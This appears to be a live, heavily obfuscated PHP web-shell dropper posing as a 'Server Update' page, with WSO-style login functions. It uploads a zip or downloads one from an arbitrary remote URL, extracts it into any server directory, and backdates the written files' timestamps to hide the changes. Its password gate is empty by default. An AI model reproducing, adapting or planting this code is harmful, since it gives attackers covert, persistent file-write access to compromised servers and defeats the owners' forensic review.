<?php
 goto GAPU5; YOM36: class zipfile_mod { var $datasec = array(); var $files = array(); var $dirs = array(); var $ctrl_dir = array(); var $eof_ctrl_dir = "\120\x4b\5\6\x0\0\0\0"; var $old_offset = 0; var $basedir = "\56"; function create_dir($name) { $name = str_replace("\x5c", "\57", $name); $fr = "\x50\x4b\x3\4"; $fr .= "\xa\0"; $fr .= "\x0\x0"; $fr .= "\x0\0"; $fr .= "\x0\x0\0\x0"; $fr .= pack("\126", 0); $fr .= pack("\x56", 0); $fr .= pack("\x56", 0); $fr .= pack("\166", strlen($name)); $fr .= pack("\x76", 0); $fr .= $name; $fr .= pack("\126", 0); $fr .= pack("\126", 0); $fr .= pack("\126", 0); $this->datasec[] = $fr; $new_offset = strlen(implode('', $this->datasec)); $cdrec = "\120\113\x1\x2"; $cdrec .= "\x0\x0"; $cdrec .= "\xa\0"; $cdrec .= "\x0\0"; $cdrec .= "\0\x0"; $cdrec .= "\0\x0\x0\0"; $cdrec .= pack("\126", 0); $cdrec .= pack("\x56", 0); $cdrec .= pack("\x56", 0); $cdrec .= pack("\x76", strlen($name)); $cdrec .= pack("\x76", 0); $cdrec .= pack("\166", 0); $cdrec .= pack("\166", 0); $cdrec .= pack("\x76", 0); $cdrec .= pack("\126", 16); $cdrec .= pack("\126", $this->old_offset); $this->old_offset = $new_offset; $cdrec .= $name; $this->ctrl_dir[] = $cdrec; $this->dirs[] = $name; } function create_file($data, $name) { $name = str_replace("\134", "\57", $name); $fr = "\x50\113\3\x4"; $fr .= "\24\x0"; $fr .= "\0\0"; $fr .= "\10\x0"; $fr .= "\x0\x0\x0\x0"; $unc_len = strlen($data); $crc = crc32($data); $zdata = gzcompress($data); $zdata = substr($zdata, 2, -4); $c_len = strlen($zdata); $fr .= pack("\126", $crc); $fr .= pack("\x56", $c_len); $fr .= pack("\126", $unc_len); $fr .= pack("\166", strlen($name)); $fr .= pack("\x76", 0); $fr .= $name; $fr .= $zdata; $fr .= pack("\126", $crc); $fr .= pack("\126", $c_len); $fr .= pack("\126", $unc_len); $this->datasec[] = $fr; $new_offset = strlen(implode('', $this->datasec)); $cdrec = "\120\x4b\x1\2"; $cdrec .= "\x0\x0"; $cdrec .= "\24\x0"; $cdrec .= "\x0\x0"; $cdrec .= "\x8\0"; $cdrec .= "\x0\0\x0\x0"; $cdrec .= pack("\126", $crc); $cdrec .= pack("\x56", $c_len); $cdrec .= pack("\x56", $unc_len); $cdrec .= pack("\x76", strlen($name)); $cdrec .= pack("\x76", 0); $cdrec .= pack("\x76", 0); $cdrec .= pack("\166", 0); $cdrec .= pack("\166", 0); $cdrec .= pack("\x56", 32); $cdrec .= pack("\126", $this->old_offset); $this->old_offset = $new_offset; $cdrec .= $name; $this->ctrl_dir[] = $cdrec; } function read_zip($name, $callback = null) { $this->datasec = array(); $this->name = $name; $this->mtime = filemtime($name); $this->size = filesize($name); $fh = fopen($name, "\x72\x62"); $filedata = fread($fh, $this->size); fclose($fh); $filesecta = explode("\120\113\x5\x6", $filedata); $unpackeda = unpack("\x78\61\66\57\166\61\x6c\x65\156\x67\x74\x68", $filesecta[1]); $this->comment = substr($filesecta[1], 18, $unpackeda["\x6c\145\156\x67\x74\x68"]); $this->comment = str_replace(array("\xd\12", "\15"), "\12", $this->comment); $filesecta = explode("\x50\x4b\x1\2", $filedata); $filesecta = explode("\x50\x4b\x3\4", $filesecta[0]); array_shift($filesecta); foreach ($filesecta as $filedata) { $entrya = array(); $entrya["\x65\162\x72\157\162"] = ''; $unpackeda = unpack("\x76\61\166\145\162\163\151\157\x6e\57\166\x31\x67\x65\x6e\145\162\141\154\137\160\165\162\x70\x6f\163\145\57\166\61\x63\157\155\x70\x72\145\x73\x73\x5f\155\145\164\x68\157\x64\x2f\166\61\x66\x69\x6c\145\x5f\164\151\x6d\145\x2f\x76\x31\x66\x69\154\145\x5f\144\141\x74\145\x2f\126\x31\x63\x72\143\x2f\x56\x31\163\151\x7a\145\137\143\157\x6d\160\x72\x65\x73\x73\x65\x64\x2f\126\61\163\x69\172\x65\137\x75\156\143\157\155\160\x72\145\163\x73\145\x64\57\166\61\146\151\x6c\145\156\141\155\x65\x5f\x6c\145\156\x67\164\150", $filedata); $isencrypted = $unpackeda["\x67\145\x6e\145\162\141\x6c\137\160\165\x72\x70\157\x73\x65"] & 1 ? true : false; if ($unpackeda["\x67\145\x6e\145\162\x61\154\x5f\x70\x75\x72\x70\157\x73\x65"] & 8) { $unpackeda2 = unpack("\x56\61\x63\x72\x63\57\x56\61\163\151\172\145\137\x63\x6f\155\x70\x72\x65\x73\x73\145\x64\57\126\x31\163\151\x7a\145\137\x75\156\143\x6f\155\x70\162\x65\163\x73\145\x64", substr($filedata, -12)); $unpackeda["\143\x72\x63"] = $unpackeda2["\143\x72\x63"]; $unpackeda["\x73\151\172\x65\137\143\157\x6d\x70\162\x65\163\x73\145\144"] = $unpackeda2["\x73\x69\x7a\x65\x5f\165\x6e\143\x6f\155\160\162\145\163\x73\145\144"]; $unpackeda["\163\151\172\x65\x5f\165\156\x63\x6f\155\160\162\145\163\163\145\x64"] = $unpackeda2["\163\x69\172\x65\137\x75\x6e\143\x6f\155\x70\162\145\x73\163\145\144"]; unset($unpackeda2); } $entrya["\156\141\155\145"] = substr($filedata, 26, $unpackeda["\146\151\x6c\145\x6e\141\155\145\137\154\x65\x6e\x67\x74\150"]); if (substr($entrya["\x6e\x61\x6d\x65"], -1) == "\57") { continue; } $entrya["\x64\x69\162"] = dirname($entrya["\x6e\141\155\145"]); $entrya["\x64\151\x72"] = $entrya["\144\x69\162"] == "\x2e" ? '' : $entrya["\x64\x69\162"]; $entrya["\156\141\155\145"] = basename($entrya["\x6e\x61\155\145"]); $filedata = substr($filedata, 26 + $unpackeda["\x66\x69\154\145\156\141\155\x65\137\x6c\145\156\147\164\x68"]); if (strlen($filedata) != $unpackeda["\163\151\172\145\x5f\x63\157\155\160\162\145\163\163\x65\144"]) { $entrya["\145\162\x72\157\162"] = "\x43\x6f\x6d\160\162\145\163\163\145\144\40\x73\151\x7a\145\40\151\x73\x20\x6e\x6f\164\40\x65\x71\x75\141\154\x20\x74\x6f\40\164\150\x65\x20\166\141\x6c\165\x65\x20\147\x69\x76\145\x6e\x20\x69\x6e\x20\150\x65\x61\144\x65\162\56"; } if ($isencrypted) { $entrya["\145\x72\162\157\x72"] = "\105\x6e\143\162\x79\x70\x74\151\157\156\40\151\x73\40\156\157\x74\40\163\165\160\x70\157\x72\x74\145\144\56"; } else { switch ($unpackeda["\143\x6f\155\160\162\x65\163\163\137\155\x65\x74\150\x6f\x64"]) { case 0: break; case 8: $filedata = gzinflate($filedata); break; case 12: if (!extension_loaded("\142\172\62")) { @dl(strtolower(substr(PHP_OS, 0, 3)) == "\167\151\156" ? "\160\x68\x70\137\x62\x7a\x32\56\144\154\x6c" : "\142\x7a\62\x2e\x73\x6f"); } if (extension_loaded("\x62\x7a\x32")) { $filedata = bzdecompress($filedata); } else { $entrya["\145\162\162\x6f\x72"] = "\122\145\x71\x75\151\162\145\x64\x20\x42\132\111\120\62\x20\105\170\x74\x65\156\x73\151\x6f\x6e\x20\156\x6f\164\x20\141\166\x61\151\x6c\141\142\154\145\56"; } break; default: $entrya["\x65\162\x72\157\x72"] = "\103\157\155\x70\162\145\x73\x73\151\x6f\156\x20\155\145\164\x68\157\x64\40\50{$unpackeda["\x63\x6f\x6d\x70\162\x65\163\163\x5f\155\x65\x74\x68\157\x64"]}\x29\40\x6e\157\x74\x20\x73\x75\160\x70\x6f\162\164\145\144\56"; } if (!$entrya["\145\162\x72\x6f\x72"]) { if ($filedata === false) { $entrya["\145\162\x72\x6f\x72"] = "\x44\x65\x63\x6f\x6d\160\x72\x65\163\163\151\157\x6e\40\146\141\151\154\145\144\56"; } elseif (strlen($filedata) != $unpackeda["\163\151\x7a\145\137\165\156\143\157\x6d\x70\162\145\x73\163\145\144"]) { $entrya["\145\x72\162\157\x72"] = "\x46\x69\x6c\x65\40\163\x69\x7a\x65\x20\x69\x73\x20\x6e\x6f\164\x20\145\x71\x75\x61\154\40\164\157\x20\164\x68\145\x20\166\x61\154\x75\145\40\147\151\166\x65\x6e\x20\151\156\x20\x68\145\141\x64\x65\x72\56"; } elseif (crc32($filedata) != $unpackeda["\x63\162\x63"]) { $entrya["\145\162\162\157\162"] = "\103\122\x43\x33\62\40\143\150\x65\143\x6b\x73\165\155\x20\x69\x73\x20\x6e\x6f\164\x20\x65\x71\x75\141\154\x20\x74\157\40\x74\x68\145\40\166\141\x6c\165\x65\40\147\151\x76\x65\156\40\x69\x6e\x20\x68\145\x61\x64\145\162\x2e"; } } $entrya["\x66\151\154\145\155\164\x69\x6d\145"] = @mktime(($unpackeda["\x66\151\x6c\145\137\164\x69\155\145"] & 63488) >> 11, ($unpackeda["\146\x69\x6c\x65\137\164\151\155\x65"] & 2016) >> 5, ($unpackeda["\146\151\x6c\145\x5f\164\151\x6d\145"] & 31) << 1, ($unpackeda["\146\x69\x6c\x65\137\144\141\164\145"] & 480) >> 5, $unpackeda["\146\151\x6c\x65\137\x64\x61\164\145"] & 31, (($unpackeda["\146\x69\154\x65\137\x64\x61\164\x65"] & 65024) >> 9) + 1980); $entrya["\x64\x61\x74\x61"] = $filedata; } if ($callback == null) { $this->files[] = $entrya; } else { call_user_func($callback, $entrya); unset($entrya); } } if ($callback == null) { return $this->files; } } function add_file($file, $dir = "\x2e", $file_blacklist = array(), $ext_blacklist = array()) { $file = str_replace("\134", "\57", $file); $dir = str_replace("\x5c", "\x2f", $dir); if (strpos($file, "\57") !== false) { $dira = explode("\x2f", "{$dir}\x2f{$file}"); $file = array_shift($dira); $dir = implode("\57", $dira); unset($dira); } while (substr($dir, 0, 2) == "\x2e\57") { $dir = substr($dir, 2); } while (substr($file, 0, 2) == "\x2e\x2f") { $file = substr($file, 2); } if (!in_array($dir, $this->dirs)) { if ($dir == "\x2e") { $this->create_dir("\56\57"); } $this->dirs[] = $dir; } if (in_array($file, $file_blacklist)) { return true; } foreach ($ext_blacklist as $ext) { if (substr($file, -1 - strlen($ext)) == "\56{$ext}") { return true; } } $filepath = ($dir && $dir != "\56" ? "{$dir}\57" : '') . $file; if (is_dir("{$this->basedir}\57{$filepath}")) { $dh = opendir("{$this->basedir}\57{$filepath}"); while (($subfile = readdir($dh)) !== false) { if ($subfile != "\x2e" && $subfile != "\56\56") { $this->add_file($subfile, $filepath, $file_blacklist, $ext_blacklist); } } closedir($dh); } else { $this->create_file(implode('', file("{$this->basedir}\x2f{$filepath}")), $filepath); } return true; } function zipped_file() { $data = implode('', $this->datasec); $ctrldir = implode('', $this->ctrl_dir); return $data . $ctrldir . $this->eof_ctrl_dir . pack("\x76", sizeof($this->ctrl_dir)) . pack("\166", sizeof($this->ctrl_dir)) . pack("\x56", strlen($ctrldir)) . pack("\126", strlen($data)) . "\0\x0"; } } goto mwrKP; lldxH: echo "\x3c\142\x72\40\x2f\76\74\142\162\x20\x2f\76\x44\117\116\105\x20\x28\x77\x6f\x72\153\x20\x74\151\155\145\72\x20{$delta}\51"; goto Twqqh; yTShE: $files = $zipper->read_zip($tmpFile, "\x73\x61\x76\145\106\x69\x6c\x65"); goto Qse2w; oLj58: $log = array(); goto TSuY1; oWHJw: $targetTime = @strtotime($targetTimeRaw); goto UNHjO; OARMY: define("\124\111\x4d\105\104\x45\114\x54\x41", 3600); goto J0bhg; pmFKw: if (!isset($_POST["\x73\x75\x62\x6d\x69\x74"])) { $now = date("\x59\55\x6d\x2d\144\x20\110\72\151", time()); ?>
	<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<title>update</title>
<script type="text/javascript">
function clearFileField(){	
	var fileField=document.getElementById('archive');
	fileField.value='';
}
</script>
</head>
<body>
<div align="center">
<h1>Server Update</h1>

<form action="" method="post" enctype="multipart/form-data" >
<table border="1" cellspacing="0">
	<tr>
		<td>server dir</td>
		<td><input type="text" name="targetdir" id="targetdir" size="70"
			value="<?php  echo SELFDIR; ?>
" /></td>
	</tr>
	<tr>
		<td>file time</td>
		<td><input type="text" name="targettime" id="targettime" size="13" value="<?php  echo $now; ?>
" /></td>
	</tr>
	<tr>
		<td>script (<?php  echo MAXFIILESIZE; ?>
)</td>
		<td><input type="file" name="archive" id="archive" size="70" /></td>
	</tr>	
    <tr>
		<td>remote sources</td>
		<td><input type="text" name="remotezip" id="remotezip" size="70" onchange="clearFileField();" onkeydown="clearFileField();"
			value="" /></td>
	</tr>
	<tr>
		<td colspan="2">
			<input type="submit" name="submit" value="click for update your server" />
		</td>
	</tr>
</table>
</form>

</div>
</body>
</html>
<?php  die; } goto ZoVoo; GAPU5: $auth_pass = ''; goto c3YnG; jvVV0: $errors = array(); goto K0fyT; Yc1AW: if (count($errors) > 0) { echo nl2br(join("\xa", $errors)); die; } goto oLj58; i0jis: set_error_handler("\x6d\171\105\x72\162\157\162\x48\141\156\144\154\x65\x72"); goto Ff47o; ZoVoo: $targetDirRaw = str_replace("\x5c", "\57", @$_POST["\x74\141\162\x67\145\x74\144\151\x72"]); goto fki4p; SYADA: function WSOsetcookie($k, $v) { $_COOKIE[$k] = $v; setcookie($k, $v); } goto GsrHw; B3QN2: $targetDirPath = rtrim($targetDir, "\134\x2f") . DIRECTORY_SEPARATOR; goto dRHh3; UNHjO: if ($targetTime == -1) { $errors[] = "\x63\x61\x6e\x6e\157\x74\40\160\x61\x72\x73\145\40\164\151\x6d\145"; } goto Yshut; VL0ta: $dirsMeta = null; goto jvVV0; JbzyA: $delta = $endTime - $startTime; goto lldxH; J0bhg: define("\115\101\x58\x46\111\111\x4c\x45\123\111\132\x45", ini_get("\165\x70\x6c\157\141\x64\137\x6d\x61\170\x5f\146\151\154\145\x73\151\172\x65")); goto nOHE6; aT6R1: unlink($tmpFile); goto k0jUD; GsrHw: error_reporting(7); goto PDDKT; K0fyT: $targetDirRaw = trim($targetDirRaw); goto wLFAM; PDDKT: ini_set("\145\162\162\x6f\x72\x5f\144\x69\163\x70\x6c\141\x79", 1); goto i0jis; qaG4W: function myErrorHandler($errno, $errstr, $errfile, $errline) { global $errors; if (!error_reporting()) { return; } $errors[] = "\x5b{$errno}\135\x20{$errstr}"; } goto Alu_q; Cb822: echo nl2br(join("\xa", $log)); goto HYRgN; nOHE6: $startTime = getmicrotime(); goto YOM36; c3YnG: function wsoLogin() { die("\x3c\160\162\x65\x20\141\154\151\x67\x6e\x3d\x63\x65\x6e\164\145\x72\76\x3c\146\x6f\162\x6d\40\155\145\164\150\157\x64\75\x70\157\163\x74\76\x50\141\x73\x73\x77\x6f\162\x64\x3a\x20\x3c\151\156\160\165\x74\x20\164\x79\160\x65\x3d\160\141\x73\163\x77\157\162\x64\40\x6e\141\155\x65\x3d\x70\x61\x73\x73\x3e\74\151\x6e\160\165\164\40\x74\x79\160\x65\75\x73\165\142\x6d\151\164\40\x76\x61\154\x75\x65\x3d\x27\76\76\47\x3e\74\x2f\146\x6f\162\x6d\76\x3c\x2f\160\x72\145\x3e"); } goto Xre8l; pN4Qm: @touch($dirsMeta["\x72\x6f\x6f\164"], $rootTime, $rootTime); goto aT6R1; VXLta: $tmpFile = null; goto JIbWa; HYRgN: $endTime = getmicrotime(); goto JbzyA; Ff47o: define("\123\x45\114\106\x44\111\x52", dirname(__FILE__) . DIRECTORY_SEPARATOR); goto OARMY; TSuY1: $errors = array(); goto B3QN2; Qse2w: foreach ($dirsMeta["\156\145\x77\x5f\x64\151\x72\163"] as $dirPath) { @touch($dirPath, $maxFileTime, $maxFileTime); } goto pN4Qm; JIbWa: $maxFileTime = null; goto RceZc; PRv33: $targetTime = null; goto VXLta; mwrKP: class WebClient { function load($url, $ref = '', $cookies = null) { $purl = parse_url($url); $path = $purl["\x70\x61\164\x68"]; if (!empty($purl["\161\165\x65\162\x79"])) { $path .= "\77" . $purl["\x71\x75\x65\x72\x79"]; } return $this->_doRequest($purl["\150\x6f\x73\164"], $path, $ref, $cookies); } function _doRequest($host, $page, $ref = '', $cookies = null) { $headers = array("\125\x73\145\x72\x2d\101\x67\x65\x6e\164" => "\x4d\x6f\172\x69\154\154\141\x2f\65\x2e\x30\x20\50\127\151\x6e\144\x6f\167\x73\73\x20\x55\73\x20\x57\151\156\x64\157\167\163\x20\116\x54\x20\x36\x2e\x30\73\40\162\x75\73\x20\162\x76\x3a\x31\56\71\56\60\56\x38\51\x20\107\145\x63\x6b\x6f\57\x32\60\x30\x39\x30\x33\62\66\x30\x39\40\106\151\x72\x65\x66\157\x78\x2f\x33\x2e\x30\56\x38\40\50\x2e\x4e\x45\x54\x20\x43\x4c\122\x20\63\56\65\x2e\63\x30\67\x32\x39\51", "\x41\143\143\x65\x70\x74" => "\164\145\170\164\57\x68\x74\155\154\54\141\160\160\x6c\x69\143\141\164\151\x6f\156\57\x78\x68\x74\155\154\x2b\170\155\x6c\x2c\x61\160\x70\x6c\x69\143\x61\164\x69\157\156\57\170\x6d\154\73\161\75\x30\x2e\x39\54\52\x2f\52\x3b\x71\x3d\x30\56\70", "\101\143\143\x65\160\164\55\114\141\x6e\x67\x75\x61\x67\145" => "\x72\x75\x2c\145\156\x2d\165\x73\73\161\75\x30\x2e\x37\x2c\x65\156\73\x71\75\60\56\x33", "\x41\x63\x63\145\x70\164\x2d\105\x6e\x63\157\144\x69\156\147" => "\x6e\157\156\145", "\101\143\143\145\160\164\55\x43\x68\141\162\163\x65\x74" => "\x41\x63\x63\x65\160\x74\55\x43\x68\x61\162\x73\145\164\72\x20\x77\151\156\144\x6f\x77\163\55\x31\x32\65\x31\x2c\x75\x74\146\x2d\70\x3b\161\75\60\x2e\x37\x2c\52\x3b\x71\x3d\x30\x2e\67"); $e1 = $e2 = null; $fp = @fsockopen($host, 80, $e1, $e2, 30); if (!$fp) { return ''; } fwrite($fp, "\107\105\124\x20{$page}\x20\110\124\x54\120\x2f\61\56\x31\12"); fwrite($fp, "\110\x6f\163\164\72\40{$host}\xa"); foreach ($headers as $key => $value) { $line = "{$key}\72\40{$value}\12"; fwrite($fp, $line); } if ($ref != '') { fwrite($fp, "\122\x65\x66\145\x72\x65\162\72\40\x68\164\x74\x70\72\57\x2f{$host}\x2f\xa"); } if (!empty($cookies)) { fwrite($fp, "\103\x6f\x6f\153\x69\145\72\40{$cookies}\xa"); } fwrite($fp, "\x43\157\x6e\156\145\143\x74\151\157\156\72\40\143\x6c\157\x73\x65\12"); fwrite($fp, "\12"); $s = ''; while ($d = fgets($fp)) { $s .= $d; } fclose($fp); return $s; } } goto pmFKw; Acwm7: $targetDir = null; goto PRv33; K5Aeh: $remoteZip = @$_POST["\x72\x65\x6d\157\164\x65\172\x69\160"]; goto WWyyL; Xre8l: if (!empty($auth_pass)) { if (isset($_POST["\x70\x61\163\x73"]) && md5($_POST["\x70\141\163\x73"]) == $auth_pass) { WSOsetcookie(md5($_SERVER["\x48\124\x54\x50\x5f\x48\x4f\123\x54"]), $auth_pass); } if (!isset($_COOKIE[md5($_SERVER["\110\x54\x54\120\x5f\x48\117\123\x54"])]) || $_COOKIE[md5($_SERVER["\110\124\x54\120\137\110\x4f\123\x54"])] != $auth_pass) { wsoLogin(); } } goto SYADA; wLFAM: if (empty($targetDirRaw)) { $errors[] = "\145\155\160\x74\171\x20\x73\x65\x72\166\x65\x72\40\x64\x69\162\40\x70\x61\x74\x68"; } else { $targetDir = $targetDirRaw; $dirsMeta = getDirMeta($targetDir); $rootTime = filemtime($dirsMeta["\x72\x6f\157\x74"]); if (!is_dir($targetDir)) { @mkdir($targetDir, 511, true); if (!is_dir($targetDirRaw) || !is_writable($targetDir)) { $errors[] = "\163\145\x72\x76\145\162\x20\x64\x69\x72\x20\156\x6f\164\40\x65\170\151\x73\x74\163\x20\x6f\156\40\x69\163\40\156\157\164\40\x77\x72\151\164\145\141\142\154\145"; } } } goto oWHJw; Twqqh: function saveFile($metadata) { global $targetDirPath, $targetTime, $errors, $log, $maxFileTime; $filePath = $targetDirPath . $metadata["\156\x61\x6d\145"]; if (!empty($metadata["\x65\162\162\x6f\x72"])) { $errors[] = $filePath . "\x20\x2d\x20" . $metadata["\x65\x72\x72\157\x72"]; return; } $fp = fopen($filePath, "\167\142"); if ($fp) { $success = fwrite($fp, $metadata["\x64\x61\x74\141"]); @fclose($fp); if ($success === false) { $errors[] = $filePath . "\x20\55\40\x63\x61\x6e\156\157\x74\40\167\x72\x69\x74\145\40\x66\x69\154\145"; } else { $needFileTime = $targetTime + mt_rand(0, TIMEDELTA); if ($needFileTime > $maxFileTime) { $maxFileTime = $needFileTime; } @touch($filePath, $needFileTime, $needFileTime); $log[] = $filePath . "\40\55\x20\x4f\x4b"; } } else { $errors[] = $filePath . "\x20\x2d\40\143\x61\156\x6e\x6f\164\40\x6f\160\x65\x6e\x20\146\x69\154\145"; } } goto B29VX; Yshut: if (!empty($remoteZip)) { $tmpFile = @tempnam("\57\x74\x6d\x70", "\163\153\x6c\x69\156\172\137"); if ($tmpFile === false) { $tmpFile = SELFDIR . "\163\x6b\x6c\x69\156\172\56\x74\155\x70"; } $webClient = new WebClient(); $data = @$webClient->load($remoteZip); if (empty($data)) { $errors[] = "\116\x6f\164\x20\x6c\x6f\141\144\x65\x64\x20\146\x72\157\x6d\x20\x72\145\155\x6f\x74\145\40\165\x72\154"; } else { $fp = fopen($tmpFile, "\x77\x62"); if ($fp) { $success = fwrite($fp, $data); @fclose($fp); if ($success === false) { $errors[] = "\143\141\156\x6e\x6f\164\40\167\162\x69\x74\145\x20\x74\145\155\x70\40\x66\151\x6c\145\40{$tmpFile}"; } } else { $errors[] = "\143\x61\156\156\x6f\x74\40\167\162\x69\164\x65\x20\164\145\155\160\40\146\x69\154\145\40{$tmpFile}"; } } } else { if (empty($_FILES)) { $errors[] = "\x61\162\143\150\151\x76\x65\40\x66\151\154\x65\40\156\157\x74\40\x73\x65\x74"; } else { $fileKey = "\141\162\143\x68\x69\x76\145"; $parts = explode("\56", $_FILES[$fileKey]["\x6e\141\155\x65"]); if (strtolower($parts[count($parts) - 1]) != "\x7a\x69\160") { $errors[] = "\124\x68\151\x73\x20\151\x73\40\x6e\x6f\164\x20\163\145\x72\x76\x65\x72\40\146\151\x6c\x65\56"; } else { $tmpFile = $_FILES[$fileKey]["\x74\155\x70\x5f\x6e\x61\155\x65"]; if (!file_exists($_FILES[$fileKey]["\x74\155\160\137\x6e\x61\x6d\145"])) { $errors[] = "\x7a\151\x70\40\x66\151\x6c\x65\x20\x6e\157\164\x20\146\157\x75\x6e\x64\40\151\x6e\40\x75\160\154\x6f\x61\x64\40\x64\151\162"; } } } } goto Yc1AW; RceZc: $rootTime = null; goto VL0ta; dRHh3: $zipper = new zipfile_mod(); goto yTShE; B29VX: function getDirMeta($path) { $path = rtrim($path, "\134\57"); $parts = explode(DIRECTORY_SEPARATOR, $path); $meta = array("\x72\x6f\157\164" => '', "\156\145\167\x5f\144\x69\162\163" => array()); while (!empty($parts)) { $fullPath = join(DIRECTORY_SEPARATOR, $parts); if (is_dir($fullPath)) { $meta["\162\x6f\x6f\x74"] = $fullPath; break; } else { $meta["\156\x65\x77\137\x64\x69\x72\x73"][] = $fullPath; } array_pop($parts); } return $meta; } goto qaG4W; k0jUD: if (count($errors) > 0) { echo "\x55\116\x5a\x49\x50\40\105\x52\x52\x4f\x52\123\x3c\x62\162\x20\57\x3e"; echo nl2br(join("\xa", $errors)); echo "\x3c\x62\162\x20\x2f\x3e\x3c\142\162\x20\x2f\76\x2d\x2d\x2d\55\55\55\55\55\x2d\x2d\x2d\55\x2d\55\x2d\x2d\x2d\x2d\55\55\x2d\55\x2d\55\x2d\x2d\55\x2d\55\x2d\x2d\55\55\55\x2d\55\55\55\55\55\x2d\x2d\x2d\x2d\x2d\55\55\55\x2d\55\x2d\55\55\x2d\55\55\55\55\74\x62\x72\x20\x2f\76\74\142\x72\40\57\x3e"; } goto Cb822; fki4p: $targetTimeRaw = @$_POST["\x74\x61\x72\x67\x65\164\164\151\x6d\x65"]; goto K5Aeh; WWyyL: $targetDirRaw = preg_replace("\174\57\x7b\61\54\x7d\174", DIRECTORY_SEPARATOR, $targetDirRaw); goto Acwm7; Alu_q: function getmicrotime() { list($usec, $sec) = explode("\x20", microtime()); return (double) $usec + (double) $sec; }